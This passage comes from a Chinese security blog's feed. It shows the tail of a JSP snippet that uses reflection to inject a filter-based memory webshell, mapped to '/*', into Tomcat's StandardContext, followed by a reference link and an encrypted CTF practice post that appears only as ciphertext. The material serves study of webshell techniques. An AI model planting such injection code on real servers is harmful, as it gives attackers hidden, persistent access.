class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
<li><a href="https://xz.aliyun.com/t/10362">https://xz.aliyun.com/t/10362</a></li>
</ul>
]]></content>
      <categories>
        <category>内存马</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>buu刷题(1)</title>
    <url>/2022/12/04/buu%E5%88%B7%E9%A2%98-1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="941071248fd19cc97be93fda44a72c67642ab6f36c8a8389ce321e0a098a30f6">997c39fd209fc88ff14214af16a192b2c0d0a378e6a90d93e73b2a42d40bfff4e41adebf5542ca7a94e3c7327072ef795c6c08f7b554ef99503e7c2dd0025c6f777abba86e3193d7c38c33f3a424e702b0dabdc08d2dd4a2a688d3acb3e06d6c721381500e8471a4bf8c6c39e82f831de40b573075097e56dbb9b94f6bc05e62432ba59f041d89d5aa22f3f536594dbe0691723257ac713ef27acf11fed6458cc17aa55e67abd4f0396b5ff7dca378c040410e8023fa9eba9accf02d2c23ab714323b90a33254125022a9dd31ac09d88bf5c778557ff7a2b1cf9e05cfe1a1248aae9f617f08b6acd21a8b8222f7d7a7faccab0e6851427bc9de65121b4d2660cee7d409059986b2ab51fba2c97cae72e72e0901489f07ffa551b1e14e70d7102f0db999eb86dab7e48e73fceb9d9f9856f65eab8362b57e17ce73ded1ec71344e3c9e32c9749a15903cc168ef11f9ddd86da62916653c90a4cb36250c3adb3270429fda496e7690fc522eabddb9b92d63a9242125512b3ecde36ec62b7a63f90b7543043256340e8b128d39b5a3c263d7926db076ff98d2b6714c4a6fc059220f68303daee13e7736182e1d19f7f55dfecd9cdc0383c8e8857c3ad39eb5fb179353efdd4e5d6499190de947192e75253a025c57397a816b782477449eaa693b34c6f707f1de3f5964281164bcb20e416bbe2cf415b278b336847803b9ed8cb24387dfb868668b29decb14c96d1f96f35d000e11afa1d2c41905843f1245e6bbdbd9e71eef9cc2472b3ad00c49923a41d46dd0d046c15f31e54fcf16a12ceff58d7dc09451fe797e3f6e9f7eec6cd1d757d86f32a376673ecfaf44aad972e8115ba21c3c91ae2ac973c6bfcba667dc593262d87cecd9179bf307b11629564f228eb0e7e559f78b9e2e6b5fd8ea3b0657684e8875dfba46999510672d5b38510e5efca587e869337866ecd2513c1216642eccc69359d9f2fe27f08789e049b777a9f8ea9d02ba212427bf00622e8aff7451713b5103a05f0282eb397e1e4b7fd7e5b35d6dfa83b63c36f262f58a707d217c3b0fe665c170dc8d4529b67e9faa9fa73c10ea270654c4cef48534208589ed2898c3457d364658715bb902568eefb06b419545c2f161bebb865c22ca95ffa821fa1b3fad6af5e658ad9c47156fd601af58868cb8d002529347f4086cc263dac5177d06fdca78a4bc759851d82044906a308c1264c5c4c37e11af0055291a37d63c2f454504f75074cc5e50414c348cbc7eecfe16ff74c1c3d216a41cefe5396b2589512d31438671d18ee57dc70990d007b439fb8db70f1d3d5609f79d079be11487ea6d5c448e04f1a02fb23f9dcc6625a73eeecdb60f813d0be83e9f21ecd44bb3d0569e2a484dff1ad7085f02cd21bae6f9fc1301f0a9742c2e2dac0f944a79e5605a4bc75688fb9fc60c54dcb3b711b399ddfc2880443c1bbfc42fc6f439c623ffbf0f598b9caac42ee4bafb93a7553a1e3593063cbedb4665b0696bd1b429b9fdb615e263933c6add25b9ad35434cea14f0f8b929549277f8b6e87cb00535d2e7290cc53135a877e17eaebf96b7e23be856d8aea7ae76db609ccc7eb279174b8a90403a4d2a804286529f0bf93f7f561e03b8b38467eedbc1bc940d02ded058fe26f810eb702c49133b4f27ef2dd74142bbaaa4fbb57eefb6637f47dc7c32ae432f7abdd71f0208714eb5426c2429b0f70e8150732ebd613dcfe1d23e17067178edad1b798eb3549392b0c8fbf18fe3e62c0f884c1ad8ee2a9393bf117499698fe19db32944d0b997d0325ad2620eb6f394726ac8d650b93d16e8c70ec1a0f993cf552a70940ca4e275c76d0a6016a8b1d7a7632f856e70ac806f22c4e7eb79e69181eeb08cc33dd0590313f9183a566099612949ea840d1c6c33b07951b4ba61e5ec9074a0c40e62238c3b3f396e3fe2d93ea18fc9df230a0d731bcab636d0a6758e33c19487ed6529419fa982a81f2133aed3de3c6d3af6a280b55031bfc8d1f9fc7e944062a860598fbaa79ab4b102ad690fc1741d54129fe5ac3442056ef4f5972bac2c9e0aa78e75242fb499fda9512a66f75baecbe203f4baaafcdf5205a4ddcb9ec9c41a72a51d1883a4c0d03b279dfeeba210d4420c4932dccaf84a2b6131182151d7ec43b926c28986a159f8a15035e39dfee619d9f904c5cafdea8a43b368360db7edd7275abf0939b484f3b8f5daccc70d5c8b4f8818d723557eb7cc5b3fb02efe31385f496d79c440d0336f99e02217f55ec149183395f4e77a2b910875c74ffd9e781807e78db16b7f79b144018351a364096d67db1b36aaf2a4cf72ae56519e52effb0a3f64ce212e9ebfdebc513fed6f940bf4184c61c64fc67b5c54fd3fca5b896e55896879b927169190c201ac56f284e1ae740108564783efb69d25f5bf057a2c70c86266bd1b679d9efed7f83a79a0228751243dc12324c41384afd30345e95fe2dba2232ffb7beb38e9d35147504a554104bafc7cd7a314ffd64f70a80a0e0560247e33469bca6867ce79d49387d95844b141838a1c06970e1cf26ebcee76909458cb43d998b07821b8276d7174a9aed62a05dcff0fe7490018f7b56d5548f256d7c63c57871a5130fd65888d1f0c640a5984ebbaca7f15658fe73d92388d0e52e155fd65841c19823cc31d57db83382fe46519b5c73b4670778248fc01953e3ffdb61386e140a29fb8f9e353fe98ec4d90d0a3bee889ff9caffefdeb8c93458abd6ce00be24ee507677b0b508492ae4b098f7c25f2eaf07e1853fa5e8506893e60c53d08f31b114c1dcdb1debca0c8f10f8e57249ba7edec0355f6718f1d5f880d51cf7888edbb77658642b611dbda6b3546de66ef6b29b5af94e0ada7bba8a97e34ad846f580a2c0b5a4d082242e16447100ab56a38482388ce882a737ad862c0c8b701eefe5ba5e24d52806aa8698cdd61678a90d4a2c3f43135436aa3c5ec64a47882e27ef97dea0e9598ce1587ea1b70664978f50f9f7ade61c8172d598dc8ad19834cb478c0c88fcd5534303a828131f26d44d812dc326b469167eb5ec4d860eed6736935d3c06efae3d7725b3c4fa39385fe2f273adf3afa7101c25e0858fb335f40e84749dec92c0b9b04fd26c8b7e5f98352aae7701931399e2b4bcf3af5347167e20cf91711c4240e352bc93d592cc5b1667cf421f8d0ec6b1481dd8382da15376afab4c0fdbcda51e681e91e967f079635368c478bd972b0f9b05c39731728c15ab982e4df754477f12830a84bb40626d4ab904395dc4f6f4fe2799c6af7d43a20927970a8ca87029dd82f1a8e0140ec47c4416bc3e5c311db0cbec39b98352559c64aa02678a452c28034f63821bc699152a02a343df47f37b52a1d1d39f9cb4e601a8fab04ad1729a79e4c12a71bb78d4dcb3526be453d6fe6fe6337bc17487dc3ff282079d0065f0a478f9c0e89a5209a76ac601b7e833d9fa86c56af43a830d2a07bfaad066634a215ed5ae3e65e735c17efd62f9c57320bc26f2e95567f2d2802fd0e296dc7e81556550c27734f7ec5fe8568b6153f745948dd4e658f07df8e85211e2bc7d4b9709f02b25ad075d9cf421990328ab87e6e4ba644d56240e51f48dcf22cf70da15e8af0f21c7863618a78a7999920bc6370e0320c6650f872a11a7de933ca6ea9d429d5b0896154e42844710e694ed18aa38ca82624773796023032b2eaf8061747ff301f6e132efbad66e1ca4fd823e1be786bbd63fb8fa7ebd4e40a065fa8ba47497e9cc575a4228d3037c9c6914832a61bd24ff1cbe2af06fc921cbd5f3b1fe8db1f5759742282b3841ea27e2e912c126552e3b08ff38453d8a7a63814415aa9ba68a6c8f42b4cce058643c61c1575775128e3b28a943d9ec31f699fe201cb928b59ddddc65e2070d9490742494f28f9d4999d489b5df46e0399cd03d824b810c2c0195fd20586b6c178c665dae5996f646694429a389b36b9a774ba89540f188e78f8398d2d3897cb8b9e7a829f40ffd07fdfc33dfcf32bc59b25aadec4ed923b07968d029328258f7b30a12318a759ffdb97c2bf28b7764a397d01aa910cf8facbe70fc216c1a3cdfdc0a627749117a86df11e610898f898ad9f5ab44d30d85d350e5687d6adfbbf509b8c9707dea3e73b3e812df96f3b4737176727263fc7d8ef43ff5ae19fd08749673a0e20106a2744ca7383ca1db02561d95637dcb96aaf1b91f637bb80e59ccfe3661db8a470dd5bd4ab8317fc5154fd2b515509c00fd9147693a38d33c6c0becb0350c2e7842393b65df5553d459a81ae2a89edeb7c7c6ea3f69dd3e2d8123546acf1e2265e69057667d8f8ad36ec9b9bfd332e80af8d90c64deced1981480ecb1ba50a9d36d58f952b480640fc508432ee1c0f683442fc4303a45f3184d486dffa71ab4af32ddb375dd2761f082a2289e10554ca45e7ff8eaa54aa4d308cf995b74ebf5be8dc6d0efdab214535ea7585cab8abc9634125fe7048e2930271916a033d7db6de8ef923fcb905388af18f50cfdbda8fd5901d49a1a6c30e379160be4fe39e85ddf5b8fc9cc58d10595a29dd20210640ccaa5feff173fbfdec79901b1de0b0d8f622684227fb0f9da65c3a4bbad1b8bec94de3b9b2fda751e3cee5b30b0e3f3ddc244ec90e105264e7c70f702a54d013b4b2fdbd82bed5305b0d2983801dcc2739d4c74663b745130c3ec5099fd7117473e4466d16dd94c57d5b3d342aec51c365e14474b197509de9348cdd89efd62daf669239e84cd443296450ca63fddcafe865fe83c0b9d45e740b8cd7c461cbc614793753a6b25b8227aa3f359142daca0d3b5b6b5cdf10f2b3eed354e33e9eb777f0119916381e5b6c89d4fa9ba75a6d8ca0136108ed9224f62fbc8e6382d629e79d78497d0a5d00f2bff15972515bf8d11a6b5ecbd4e43a66e31cf3eea9e3b44ed81060d58e0634b473b136aefa8b19fd8f6ef8adc824a86d26c0536fdfaa62bb25dde5124c4313002552fb9075844376e701499c57d3120cc5ab6e32059bdefe351cf851c231920867e18dfe67c935bca86f44b25526ac46b0310b6406efc0b42c8f15ece3442c91a56481e14d8cd493b907022833d022e7b5e0d739d8b493bffb433d83913ec77d8984e26b704501a1ad01037240eb43fc30fc1a1b0e8da94777ab9a18998df9167f689a231dbbc34cddb1aecb8b574dd252824455497d69e3c33bec2787bdc86b80453ca2b884767b873164d0dee65149dada85d229d3057f3bb01ffaefbd92e280cc8c91c3bfd3ca8a84d57b5ae01f4d3f6c30659842b417f1c5c2f16281f6ac5101b325c74d7ea10193c3976826d93a35d62a0b49b7451371a3431656b5fe100718fa252890d241dde40a0142ab8f0b57b7c1fb58b69e99eb65aba3cf6f540566a1d26a9b34921f4588a92476cab84138d370e2c03195d48919081c560ffec89ae8812d4235ea1a147c6fa94209da097bbeef27a04e5d872a9f2946932743da9ec3f3b00d1fec60c4a5dc79b2c1cf90b9e871a441a8e62750239ea0f2e97463a44feaa7d7409d715d515590195251d032e2094f7ac30a1357f1f71c9fa910419b6dc993fd1b2f4ededcf96151e827d0c7be5f7cdfd8f715e3d5a898f5aff1b0a785b40c946613e30e1f9dae281376a134d95bd715889df12759a38af5d0c70e7fe15be902f5935bcc888f3448236958252c976bce4d800cba0230e9435202c9b176747f3ff3690c8729ec2abf81f358975b6185c40177fd8ebc95689c3010392dd242022f7afa0594c0916877e91df2952c829509127a116517e607069b3d6c3f05443cd8461a4b546764f55bb7e75ccfe5dfd0346b0e9b6b51496c7cb6836cc435b9071d72f72ca4ae5ddbc3ae6a2298d1037b2d0728c146e99b8aac9820ac7e831368fe971e0f64e3e54acacd66817c7d6f0b1fcda7dbfafe9f39273e635cc72345fb3cdef89cd14bee3133beadbe329d05db7e4058a8b554d00ccf91c34badee2f3f48371476125dc66c7e430a2a6cde9adb7841bb82dd02240762d59e20b50067a0f0006c15d95db42ce487ad01cab7e727bb356934598e3826dedbc8319ac9729a8dfaf7ac9d2e9df9cfef6c9d4a78d689ff254f81677e76c60714283684fff37d58febe8c84871a9f74885938479c325b0e21a8cba7c82fd4149cfbed6ae0f3f9050e782b7bf43f9a1eb478927fe2b2d9e9206f376e420fe5779dad7d8f2c916a8647b2f1ee753b5511ec513b8b76e4e30e5a6ce106e354dd3b85b80708f99b32b02fc452d4ba78623ce9b5c0a5ee063ec9dcb59eb09bf1300ae6a5430d11ac399b166d1b378381e89f931616d2533384e9529d4e51017cc138e25cec4b956449f40e3c099542f1c6e79c7753d18655c778c75b2e0a6b024e7c0ea54a35e7b5dce10e9cecb1073d422ae776ffcbbcf22d30699d5e8c4748745d09c1696ca61e8c179d43c655dfe61c398d01310e9a84c3d7e4e64c339de67b685f10e8a84fc3355b8e074b63d966fd95a8dd1237e10721634795adc1b0b2d75569f61126c2babaec8ec05d14fdee67eacd5695147c7378574325c4ae98ffd16fe53b29f405c08f66c6abd48f79195e9327ec0aca0c22d7ede8f275fcf2f33552fafe574f265bd4010434817b06d7ac9566503302d5879aa7850f9d4798164d63b314cb60a6c1e2abbf732c4f0fd13f464bd279cf6667b9c4967c038b52c93ba927b48386673ed9a2a73d2b05dd9c6dfad3d39e49b34e8554b15015d6803c8999cecf999853c7cb9977668d48c71b345f93b3d2891107c8a5934d666cd1207030ff7d6df509b9579b382c5c199e3ee51ce2a645ffb37eac61bc6bc348d34dfa8e253aed1df925aec81e228ba49baa304efe6ff6d71cbdc31db2d97024a59656f13fa09b7a4a8f3d0f84d69d134142b8b5cdc4169fa4a9cc63f758902e682a82e921c766dd5200c87638afd688ec28b3efc9cb933b6211899e83d0775683317c2dfaf1ec429b9b6e4063d1cf8a84dbf9b3a90dd2e5dded7359a6e55c529f98b9898a0b5e6a4265b651c270d76342010ef6dddaebb26a0c678c7ba71b66bed092d103de7d637f2cfce1afc7a0757090ea3d29262d3bac90c887915514926bcf91054e00514d13d296bdc3d6443f20a1568b3b23323c485c9e9b21d3d8fb518e94d03b774990453aa4417f5cce99015cc129ec60935ac33d0cd83a1df0892a2b3480f23d531fe44333089fc5177996b627dd2cafb19522dcaf5c426440f10629a1e791ba4ec256927fd4361d576bcf7a37ba26c335ad11e2018ae141ad5091bae573bf8e79eeb3a48867e554c133786e34e7ae243f48d94c5d94faf63b3ee508e48fb99600fbda61f44735b72d6a52e1e3530c306e2b43bc4260f23266a75b429800769c6e1e70de5b8bc415215305cab8c1a342ec895cd1ba8c2b18cd78a28d613fcc9b5ef3f060f615d5103b4990ab50b708da28793a31015f4ff8c87e54b7512454c6858e167602dad95643a4f7e53543f290f73fb0baddbbd9cc10074a4b08ece3febfefe6cc24381eec69d859770b750798e90b78843aa9585678f5be2232e54822e6596f5c443d4ea69d73b75426196a19da3b6795efc5dfdb2c139e72066e938a789c1e1b4ec611f82c9115e49c5d580a46b860da0a47cafb1cfdde7a3e3562fd5e881d6d8667b3029c8cf8976f10b80e92659f209c252111147fce68bc0a8a8bce00fdc8b2a02c9d3e5402008fb4873c2abad6c47ee2c37d2e967b2fce3402ca9b0569c090f7e3993a2610950a4ba9c2fdf116231c34ef49a6b42befc2bb8ee0881b9b5fd1e8a9e62b13aee77f4b15ba5ab603ad83079ab6e1113cdf783611f062f610e748f063f2c1977b03dd534311073cbee17af232352514ce892edf15fb162c01198fcd6df6b5b1f8afb9e2735c44c0762442fa50ac2dd2def39f8ccf089000f1afc41747ffdc205a4a203f260451a0a1240383cd8784a1685a25695b6eaf821cc98b359ccb1e9f1421a8afa359cc8493d333491eb96c6388569c4a7d700c8bcb00ef4ebb9ab8faf84bcc36eb8f95a71f79957608ade2a8011bc2a6df33d9271408ee059982fe40e2e9cd2dc0785b9bae152b10e7617c58691bc3a7c6fb09c8a682c5f69ca231626db2c8f85d4fd08059bd4dbe9be0109b307c623de10df352c579839ba1aaeb74d219a06bd4e25aac5bcc8e824c90831772be6e5c2eff3c0b7c1dbfbb6a5a98131c1cae588449fdde638b1db0c5ff60bdb6cdc12055b34da9ca3d700ab80201d89154fea347ac95fa28b62931e7cd93d2bd77749c26f26b6dc3b05a66f54709524de735ec748cc6c0cabe019e0719fd6c5db482c1051acd84fe36609a463042e6689d8074216716d9f2ea30bb1228f50fea852905c285453524d9fbe181aa693caa71657f2aa718adf7e4219eaf94ece18c5ddfe515229d966151be4285b89135301e936a1c6e6a10b376e5526697ce23832f9a3b422b9b13b1b30e542b38aabaab7f1ade3ad6297712faaf0c4f227579b27cc6ae90c9538dfd71a2e5a40a81deb50633839fa0ca518c7da63c6792fff0b014f413a443ce66605a8efed0b236b2ebb39c804e73ca681eb58d22e0bff4ea97a73a1a8167ccd401b60ca745caa455cb55588477ffcc2d3fd0e2bffd60f3816ac35897d7101e35b48b3f02e08e6eae9f70bd010bcafc17f9b2c6487e7de05728415ef6aac45c50815963773c652dc40b1ca20bac9f352bbb4abb56052b7b509a015eb015725cdc41e28285eda547bc663f888e4ba7e9b2ab9816bc114fe582459cbbbd38543cde2365fcdda93fe0a133e99f11eed990423f83453d933b9586bdbc6d4ad158d27f3beac49910763d492f0ee295149c383b049ea46de907da5ac8aff75ba7d49246314f7f097892be68a08ece8557997ad2df2a185060d8faaaa88ce63670d40f52e540ae92035149670313c440dcc89fc64f8d6e5eec31827a385ccbd4c55763c43e5b6ddfe29a514fdd8cbc6a0f756b3fbc1305d0b574d77c9afcc0104147d6a51fc01b1b226b20984c78baa8b894fda58421cff5f87f6a146d340a22fe07104c283fb1593de7ceb846e09b8cbe97e1abdf2ed04c640917abdf91eb25e2c183115c8377c63203e85fc7c0b39c2bc84a27800100ee04a5296a2d088333b14853929bc71cec2930d1caa60b47c77dbb5c74b99288c6e485a1f85885210287afe0b5bedfb6da7ee6ca16c93faf2b1cfe7ea33ed0e64a3d861bae7644b367288297294ac46f4646e3dc4cdeae1af4be5e83577d1685a15638ee57cd3e47ff04c77f99e8fe3209f84230d42ceeb3c04a10b8fee30be09be30b7479f4e4cb3d9577d035b301c9d7e543512305d056ef8812f24d9f13c9c0590eaf12f603e6be2a2fe86dd57d269339a437033cf3fc157313d0a89d256d01b9ad1ab33c8b699b6c05ae5be38a5d439e2487f80a4228606d361efc6936ff6cdb2e028e19d8f29f43921afdbcfbffc35e3961303c6a9eb7986ac598ff838066e36dc62c43f0af05717aeb9e593e0083b9550a5bfbceea9e5c8d5fdfa22239b87762744dca96a671da5f624f3bbc77c867df280a37c6ef895cb0d16fe0973dfc91c6de2c1e3c7d13ac0c94e5b82c259b7526bc8d2968e0b66dad7ac7af8e4baf687e1f0da482b3b9500aec7ebc6d637ea5e23391f9323773d0cad840b09fa283aa4f86f7039b58b3d254b18f0b479ab0f486cc2f7732d836689e2dcc1088ad88812aade324648c72ea4d53446ca10ab0c75b85b95a7a8b9775816ffc4c276b7a57eb95da76ee3f8ed07a2029c50a742c0c581c32ed38d4ced2cc4fd562e499ffeb3a930defe8b81fec9fbac0a73c8e50b657a9c90b654ef0dc0a1c6177f22901f4945688ef08640e2b39e7ce4423375d32ab0eb6a9ee733cac89afcfacda2d9caed62c780d2802499229870c64e0a69fb0a6024539a70e9554a380589f5a42617d646fa4c9f675c4f4c23eac4369aa8aeab719a07380c41a3c40655c7450181baef7ee7357fed8245737db7a159df3722f87391dfe7f89ede8b1d28c1f34e84090c437974d42c0f36e92183d25ded701e8c198356ea77bbc10fcb0fd06a40047954927d1216b4258f788bae215079e881f3cb8e4f2953e809b03d85f5fe8122e9bf7f30641a1e742fe453327e7ec0e0a7dba9322210b3cec125e72d462d719ed9eb61f01393ac6c41f28ee7c155dda7bd051995523b4927f4b69eaf2aba3c8bae1941033c323ed06fe1802d69d2cb7c1007a8323e1921e98a473d1f27ad3f36fee34e7ca4d21ce490e920080c603a594bdb9a9c488af8ab196acb17f13e4ae8b3fc59450483eb2c3326772891c706385abc0a8044ae5574adf62c855f5d41d446e3ed2d203beccdbe31a1edf50263c209631c845345091b7612ae55e40e7ba00a87f8ef4910cc41d0dc91ae34804f39533200b71eea04dc43338c454e1b22552d1274e0a24dc0f0d24816de5e5f3794bb5e464e291347b71fc0c4da702385abaad26f23bd7f766815cc51a58d865288809ad1514ef26cab96b21cc4b2e2580bce69e1e7252a58450326cfb2ccae3c1e71a5156d3620a6ff8eb9b6213434499c1c76153744503179dcd715ee8e2fc44dd7a771879f042417bbd5395c1864483f40f80f845f730302aeae0976b44041497c0255c1f7fee6f095b4a4a45d1bea5b5eedc554480df02cff6fba383688a7f6a0215090f8db767205a1b388ce8545d17762ad735ccb8b7149a32f0b488cdc08f160eb39f776573e98eddcc202f93309c35ccd25018709744d82ec3d7f2986cbf709748208a8ea681e362f41592976bb8c03d73e24a12d6eba385c918e9e14b724877ec6f8d50f2e375cd0749f172f078cba852f2b725ab6a3acd78682be2ff49fb0b7fec11b94363e8657a6dcdfd226ac0f4208fcf6281c103563d9fec8fadac49dc4fd785a94bcde1578f29f30979e4d8ac0dd5a7a7dc9f1d6074b0d348d9abc5431b0fcd5bd4a25dc0e9c965f32a699e5b0b6d6c0c3a64c22209bd2914297df967b5f47df8fd79124f33e9e754c5a24fa4b994cb10829786da16460184dad1b26180e3227703fe8f86eadc63e1e395328423e65a3b63e6773d30eaca2b5d206bb38ebccce7958499dcd1c1db7e0208a6f3984eacd8a7564b61d021dfacd6dc723c54c6dd595bca415cf3ed4f62b0ec12cebd2fa08f134a0460fd8dd7a66649b78fb88d1957556fe90be9053b28cae1e643fc91db44ea220b7d30a329ada7404a1a120e5870b3252f6c996822a226303aac93f133bd7bb5cf166f5662d07f7c3fa1b27679f2d57b24db2fdceaafbe9bd50f8439a72b652029fc1fd2484f218e8f69a1ce57f0532c4aae299bd0aaf83ba7845b05115f6117ab1cac3da89da7301ed2c57ac0f34afc324d96d69ec5ea46ac0461cc0fc558815b3d70ded3231f163792eb51a65f2c5ded9bf61c434328ddbdb0811b9c6fb0b8d2905708aee1d25c28021f8e205ceb7308763a2fd6d3c1864444a07ef6f30154ab81a4e244d50d5203b4e322d5813fa4bbccac89c03add200894ef5578be0d505ffec91d2670fc6c2dfb24a8fd2b3cfe30bd28a12041284f76bfcbc6126a5c09816ecb1e242b7c8b2378777d268fafdebff0a265159ca808f7f6e98bad404068080d11d412d5eb74b03a834cc869f16784c8af1289eb710d567f09c5358e74e5b396e6471135f11f1cc64464b55e06ba4152e455f162df7b7c67d54c6da6755ade626852e005d5d076340a96ee15518b778ca70a8c26d222be338bfaa916a75d686108ba21be77584aee84ac52d1089bd7d81f42ccae7eb08b344c14b193e7996c276ba558d22da8c9e56607059ea1ae9aded776472a88d73705dde5a4e51c95b7cd176761c4a118fe3703eb7de73ea28d2fe0156e7b88c69983d54fb23332ab940a1e816f2ab4a69fd1aafc99deebfbe7dc9431ba2e888e2933481a5a5bc798139341d565eced58221988201f0b15d8a8c7988bd5d0d752ac814d54beaa670775e8541f5ccd95967529839e0a61c958cd9bcb0e6aa19ecbd0a90be39b1ed9878d632c71c1872e06f7dd2c04a1fee259140e28e1c043c8a2f3dac60eab43d913206d97451aefac326bc0b32dceafdfb4f2d787ed8652c76eab8e9a3e62ee49d5bbbe85749c46243d28c4e923d9c48322ed9340e2ecaade632fe90c358da9ab523b86cf7358e624c6f355bbe63220eec525ced8d1579d33385f411f5577192586da7e881c6fbdd52c7025b3d426901a9ae4fa565a6fdb01fa82d9e8dce13a05d58b5537d3079299e240b363169a7d7a188edbd3255996af31c0cb8988a21daedd260751195590c6862bae0da1b154375efc6bb1fce022047065e1f91d72077dc261a55db339021be3aeab35436495180d6d7a732c153bda7d368cc3b0c41f55b9adfcd02af49f05be3665f75217fa96784bce6978600f45eee06c93c06b756c758d948a64d4057dc9bba4d5db72608e2bc06ae30f9cccfcfbf04cec05ed12de907174bcc12a3281bd47aec673e64ab6326e526c93bf95c92183305635808fe2892e54135716b84d89e514bc253b1454dec336937b638281ac5da273c505c9ac60d8355625b93ef558bcf6fa6c457bd3f7940bf3c2165ec711b15b4b72022fab348fa7cd9d9dc429aa6a3eccfa1c4dadcfe0779ae1923143dc6fa2fdd1c943e967d159a62f24162b0abcb67852960e1385a20bec9654ef8533969c095ddb364603932c126de17cf8f20f3cfde4454047fca6228ed43d84ece0c843b7dce6b4999a876786a330c67f8ea351d232b698da05048769204702316b5f5246f541e13a49e6cfb32497578ba86ef3cb0eebc5cb025e47c3076060bc433600e6a066f3415572bd6b3a9bd2063ca77b3e124d7b25537e828af3ff039d9d539bf3eff308e62d604cc29a39752e92a08a46df455d555eb2899d219b1d8914507db9cc064bb4d6512fc6460cbc027cb03b018a11085c94a7af23ecb628b8ba7516a807a58cd825f391abf296cc2d0b573c82fd4405353c82851a1e5fd7ebbf090d80bb12f8705a41ef2abf259d487bad769c048a208d64803943109cd8494d2491ffc6092a76928883408c835ed5b98efd892bc744dc2479bcf672209d007432e1f534b260a4850886944aaeb9255b774ae13f0c042c5b9d48dc97ea002ab976c25d250b7c0855a4301200adbba0d10e3ed6214b3d4f04f0925d2c451e69a5f111b4ae61186afeef56fd0f5fc279f2c8c5705814755783b0032915aee40034deaedd380c3333401a37ed94556c56ab85188c93a8b6ab5c5023ed4d553c6294ccb66971fecc65bf9c213ec7551847ddf890f5b31ad7cf3b369a5718dd33884bd853b757d15870397df75d70a7b9066fb772373a1a44e805a2f6a0021ad0cb17387abc3599a1a68f014a20a540408fdfe86ba7577a962fc3adf24e51bc6ce94685c31a432803b87c42017e1807f3235a642c40503bbb37f8ac9fe66e8858aa223f1ac85af6e85d5955ff855d4168f39de5f168341b7db3bf048fde4f4558ae9f2f545ea79e8469bc153298153d452ec9975f77f90c9d8a681492a8b5e15c3e1d63ea56b5bb7127b643bf12890a54386fe9c5d9b2a81235ed7d852f23062f9e08426dd349719815ad6732d9d0d57149e3b4f46320b208cac1ac919023f767845a7da3c1afaeded31dbd12f22811aa557b945dd27d25d772b7958eac022707228addeacdbc3cd43336790d48f62875b27ee0c13e2718af49d901ff79de64173589652d2e03a2562fe86e72adc45b6a9a9bbe4f2874d507de5d7109e5094a1cee6583404cad9cbac1bcd8ac2098d0c17412a6e47fdc65d6bda79a64959d6baa6fead805e9cc647e234da8a0207b7436d9e42e7ca8aaaf60e691d734d8edfee32c33eb99d5339bcb0a7bae9c7dcd43e60a1aa2764e9287230ec8e121f121fb971c959820205983c1742b7e916560cd548641347c2ff2e78b6b0e5230edb7f5521d7f5bdb940d278e90f3bee04999a2ea8d193ad89759c9917f5875e4961108750d89d667b40d3b87cdb54e248fe184f9989b7c7739b89cdaaf3e88a7bffb2ab2b203d4c62eb4d2ac5e6ca3f38dd6ad9e4c722e2d4b449cca88d455b13161344535888fb80239ded73eb64d844abd0c503d8f904cf3182d93b68cf7aec8a7c9fb298c14761ec4eebe70ab2b62453be3c8a31f9019039b0597a3ea49cc6fe8df2191a50142671d65fd8a41dd759e7a097d584a165bf5d1060b0fa66f3258173d0d5417bdbcf9ac506f642bedbb56f1d4905fb7796b3d52c7dd76711af860ada7bbb192d256c0a5527d671cd96fd1a343bac8276a333a51517fdcde7526c556c415076f2957724937f0c64f74095b0a396e42ec3ced170ffa39a560a3da8331ce71cecd93d4f0e3b3f8d82c257051f63ff21db9bbcb3a4a0f025a8603ef40a76f27847fe78f9e2f836d084a8b63a4b4383fd47aa302e751495cb382e0846e1823fa2f6b7dd86815f5f93949eead76dc4a2ee8fd0b885ef099ff259a8f94125401936de7de54bf175a0d9151b9a78a62a9772d5bc416920d9e54acd08dde4c08162f07a2a037232e02b6eb23f15a2f0b79713c3cc0fd563bef5e1ba0177a45b94f73e103919ea533513f28999703bfa9e71d235e07f991c00ed2b76228e4daef87947916caf4c2cfaa6b16f7aea3e37f971ff4c72f60b0b439992948535bcbcac684144d1b3c0c44b67a9e11fadaccc91acaa05539f93f2db017208c591becac956b573486e78fe28ea3778148e0b97250e4ca88ab90c1b7e4e9d976f52963d882643626cad1870452e08d88406d59236a367418aaaef8612f8cd82f616fb47ae291bef7a1c040658a529300d5e7d8c7b97fe8263540f2a2fa38a58265772596eb6e4214779abed0f2d5a89104eaae0b047b733e30318541f2d3b2409114f5976cc1a0c1b8f20b04ffbc536c8325d177e4636f790b9e64637aed385db53df8f70642b2a21626d03667a5a52ac31524e7a5cb2bc4f00e826f7859c1aef5e9e2b1c846e431ae8dc05024e0897d5feee7980a0d4ddd4ba6a2245e124edcae45c59b7caac931cad3589ed2aafe87a08fd0b7994d39b06801adb233563a1c5f2a4d59874606e98f35c9ce4a90fd3ae65b73bbe7958a77914df26f9e2bbec2bb64a0906f7813de77cc1d892a9397d0603bea66c27dc8d60cdb0f32feda86d52c6bafba7c150f4245a06b9dde1a5d9a0b17b4af6894068cdf3efc6646e481c464cae4e18cddff8f067b396f84bfde4bc1030de616b56f3933ddb3d2b2426633cf2b394bb69400906bba82e44b09fb14fe7ca78b94a2e68101dfe539188bb5680030fe6d76